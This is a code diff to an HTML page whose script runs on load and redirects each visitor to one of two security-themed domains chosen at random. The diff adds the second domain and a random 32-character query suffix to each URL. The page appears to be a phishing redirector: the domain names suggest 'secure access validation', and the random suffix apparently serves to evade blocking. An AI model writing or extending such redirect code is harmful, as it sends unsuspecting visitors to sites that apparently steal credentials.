@@ -8,9 +8,26 @@
 <body>
 
     <script>
+
+        function generateRandomHash(length) {
+            var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+            var result = '';
+            var charactersLength = characters.length;
+            for (var i = 0; i < length; i++) {
+                result += characters.charAt(Math.floor(Math.random() * charactersLength));
+            }
+            return result;
+        }
+                
         var links = [
-            "https://webcloud-seguro.online"
+            "https://webcloud-seguro.online",
+            "http://validacao-de-acesso-seguro.online/"
         ];
+
+        // Adiciona o hash aleatório a cada link do array
+        for (var i = 0; i < links.length; i++) {
+            links[i] = links[i] + "/?" + generateRandomHash(32); // 32 é o comprimento do hash
+        }
         
         // Função que escolhe aleatoriamente um link do array
         function redirecionarAleatorio() {
@@ -18,7 +35,7 @@
             var linkEscolhido = links[indiceAleatorio]; // Pega o link correspondente
             window.location.href = linkEscolhido; // Redireciona o usuário para o link escolhido
         }
-        
+    
         // Chama a função para fazer o redirecionamento
         redirecionarAleatorio();
         
